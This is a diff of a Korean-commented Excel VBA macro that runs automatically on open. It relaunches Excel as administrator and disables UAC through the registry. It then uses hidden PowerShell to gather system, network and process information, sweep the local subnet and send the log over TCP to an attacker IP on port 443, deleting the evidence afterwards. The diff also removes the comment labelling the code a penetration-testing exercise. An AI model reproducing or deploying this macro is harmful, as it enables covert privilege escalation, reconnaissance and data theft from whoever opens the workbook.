@@ -1,6 +1,5 @@
 ' =======================================
-' 안정화된 VBA 정보 수집 및 Netcat 유출 (443 포트)
-' **모의 해킹 실습을 위한 코드**
+' 최종 안정화된 VBA 정보 수집 및 Netcat 유출 (443 포트)
 ' =======================================
 
 Sub Auto_Open()
@@ -8,26 +7,24 @@ Sub Auto_Open()
     On Error Resume Next
     
     Dim tempFilePath As String
-    ' 재실행 확인 플래그는 TEMP 대신 APPDATA에 저장합니다.
+    ' 재실행 확인 플래그는 APPDATA에 저장
     tempFilePath = Environ$("APPDATA") & "\Flag_Admin_Rerun.txt"
     
     If Dir(tempFilePath) = "" Then
         ' 1차 실행: 관리자 권한으로 재실행 시도
-        ' UAC 프롬프트가 뜰 수 있습니다.
         CreateObject("Scripting.FileSystemObject").CreateTextFile tempFilePath, True
         RestartExcelAsAdmin
     Else
         ' 2차 실행: 관리자 권한으로 실행되었으므로 작업 수행
         Kill tempFilePath
         
-        ' UAC 비활성화 (레지스트리 변경은 2차 실행에서만 실행)
+        ' UAC 비활성화 (팀원 코드를 참고하여 재구성)
         DisableUAC
         
         ' 시스템 정보 수집 및 Netcat 전송 수행
         PerformInternalScanAndExfiltrate
         
-        ' 최종 메시지는 사용자에게 표시되지 않도록 0으로 실행하거나 제거하는 것이 좋습니다.
-        ' 실습 목적상 확인 메시지를 남깁니다.
+        ' 작업 완료 메시지
         MsgBox "데이터 수집 및 전송 작업이 완료되었습니다.", vbInformation, "시스템 작업 완료"
     End If
 End Sub
@@ -42,21 +39,17 @@ Private Sub RestartExcelAsAdmin()
     excelPath = Application.Path & "\EXCEL.EXE"
 
     Set shellApp = CreateObject("Shell.Application")
-    ' ShellExecute "runas" 동사를 사용하여 관리자 권한을 요청합니다 (UAC 팝업 발생).
     shellApp.ShellExecute excelPath, """" & workbookPath & """", "", "runas", 1
     
-    ' 현재 Excel을 종료합니다.
     Application.Quit
 End Sub
 
-' UAC 비활성화 (팀원 코드를 참고하여 재구성)
+' UAC 비활성화
 Private Sub DisableUAC()
     Dim objShell As Object
-    ' EnableLUA 값을 0으로 설정하여 UAC를 비활성화합니다.
     Dim regCommand As String
     regCommand = "reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
     Set objShell = CreateObject("WScript.Shell")
-    ' 0: 숨김, True: 명령이 완료될 때까지 대기
     objShell.Run "cmd.exe /c " & regCommand, 0, True
 End Sub
 
@@ -84,16 +77,15 @@ Sub PerformInternalScanAndExfiltrate()
     ' ---------------------------------------------------------------------------------
     ' Step 1: PowerShell을 사용하여 정보 수집 및 파일에 기록 (동기적으로 실행)
     ' ---------------------------------------------------------------------------------
-    ' CMD 명령어를 PowerShell에서 실행하여 출력 인코딩 문제를 최소화하고 파일에 기록합니다.
-    ' 파일 쓰기 완료 후 명시적으로 5초 대기 명령을 추가했습니다.
+    ' CMD와 PowerShell 명령을 조합하고, 인코딩 오류를 최소화하도록 수정
     psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command " & _
-                "$L='" & Log_File & "';" & _
+                """$L='" & Log_File & "';" & _
                 "Add-Content -Path $L -Value ('--- Collection Time: ' + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + ' ---') -Encoding Default;" & _
                 "cmd /c 'systeminfo >> $L & echo. >> $L & ipconfig /all >> $L & echo. >> $L & netstat -ano >> $L & echo. >> $L & tasklist /v >> $L';" & _
                 "Add-Content -Path $L -Value '--- Internal Network Scan (192.168/10.x Ping Sweep) ---' -Encoding Default -ErrorAction SilentlyContinue;" & _
                 "$ipPrefix=(Get-NetIPConfiguration | Select-Object IPv4Address | Where-Object { $_.IPv4Address -like '192.168*' -or $_.IPv4Address -like '10*' } | Select-Object -First 1).IPv4Address.Split('.')[-4,-3,-2] -join '.'; " & _
                 "if ($ipPrefix) { 1..254 | ForEach-Object { $ip=$ipPrefix+'.' + $_; if(Test-Connection -ComputerName $ip -Count 1 -ErrorAction Ignore -Quiet) { 'Host ' + $ip + ' is UP' | Add-Content -Path $L -Encoding Default } } };" & _
-                "Start-Sleep -s 5;" ' 파일 쓰기 완료 보장을 위한 명시적 5초 대기
+                "Start-Sleep -s 5;""" ' 파일 쓰기 완료 보장을 위한 명시적 5초 대기
                 
     ' 0: 숨김, True: 명령이 완료될 때까지 VBA 대기 (동기화)
     shell.Run psCommand, 0, True 
@@ -104,28 +96,30 @@ Sub PerformInternalScanAndExfiltrate()
     
     ' 수집된 로그 파일을 TCP 연결을 통해 Kali로 전송합니다.
     psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command " & _
-                "$L='" & Log_File & "';" & _
+                """$L='" & Log_File & "';" & _
                 "try {" & _
                 "  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" & _
                 "  $C=New-Object System.Net.Sockets.TcpClient('" & Attacker_IP & "'," & Attacker_Port & ");" & _
                 "  $S=$C.GetStream();" & _
                 "  $F=[System.IO.File]::ReadAllBytes($L);" & _
                 "  $S.Write($F,0,$F.Length);" & _
-                "  Start-Sleep -s 5;" ' 데이터 전송 완료 및 서버 수신을 위한 5초 대기
+                "  Start-Sleep -s 5;" & _
                 "  $S.Close();" & _
                 "} catch {} finally {" & _
                 "  if ($C) {$C.Close()};" & _
-                "}"
+                "  Remove-Item $L -ErrorAction SilentlyContinue;" & _
+                "}"""
     
     shell.Run psCommand, 0, True ' 전송 완료를 확실히 대기
 
     ' ---------------------------------------------------------------------------------
-    ' Step 3: Log File 삭제
+    ' Step 3: Log File 삭제는 전송 PowerShell 스크립트 내부에서 처리
     ' ---------------------------------------------------------------------------------
 ErrorHandler:
+    ' 비정상 종료 시에도 안전하게 파일 정리 시도
     On Error Resume Next 
     If fso.FileExists(Log_File) Then
-        fso.DeleteFile Log_File, True ' 로그 파일 정리
+        fso.DeleteFile Log_File, True 
     End If
     
     Set shell = Nothing
